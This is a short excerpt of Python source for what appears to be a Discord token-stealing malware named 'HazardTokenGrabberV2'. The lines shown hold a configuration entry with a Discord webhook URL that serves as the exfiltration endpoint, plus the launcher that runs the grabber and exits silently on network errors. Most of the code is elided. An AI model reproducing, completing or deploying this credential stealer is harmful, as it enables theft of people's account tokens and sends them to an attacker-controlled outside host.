...
__config__ = {
    ...
    "webhook": "https://discord.com/api/webhooks/1247922381046153357/-JP9o9HyXkTmLCA9K3r2FrZtwNt9zEpxoMnsHJD3MBCwwMjXfhtk1LbEdc5IV08hQ31F",
...
pt (httpx.NetworkError, httpx.TimeoutException):
        os._exit(0)
    asyncio.run(HazardTokenGrabberV2().init())
